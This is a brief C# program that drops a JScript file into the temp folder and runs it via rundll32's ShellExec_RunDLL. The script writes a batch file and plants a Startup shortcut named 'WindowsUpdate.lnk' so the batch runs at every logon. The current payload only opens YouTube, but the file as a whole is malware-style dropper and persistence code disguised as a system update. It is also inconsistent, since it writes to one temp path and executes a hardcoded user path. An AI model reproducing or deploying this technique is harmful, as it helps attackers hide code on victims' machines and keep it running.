using System.Diagnostics;
using System.IO;


namespace RunBatWithJavascript
{
    static class Program
    {
       
        static void Main()
        {
            string command = "shell32.dll,ShellExec_RunDLL ";
            //path js drop
            string tempjs = @"C:\Users\pc\AppData\Local\Temp\1.js";
            string path = Path.GetTempPath() + "1.js";
            //javascript bat drop and persistence
            string text = "var fso=new ActiveXObject('Scripting.FileSystemObject'),WshShell=WScript.CreateObject('WScript.Shell'),temp=WshShell.ExpandEnvironmentStrings('%TEMP%'),fh=fso.CreateTextFile(temp+'/file.bat',!0);fh.WriteLine('start https://www.youtube.com/'),fh.Close(),strDesktop=WshShell.SpecialFolders('Startup');var oShellLink=WshShell.CreateShortcut(strDesktop+'\\WindowsUpdate.lnk');oShellLink.TargetPath=WScript.ScriptFullName,oShellLink.Description='WindowsUpdate',oShellLink.WorkingDirectory=temp+'/file.bat',oShellLink.Save();";
            File.WriteAllText(path, text);
            string exe = "C:\\Windows\\System32\\rundll32.exe";
            Process.Start(exe, command + tempjs);
        }
    }
}
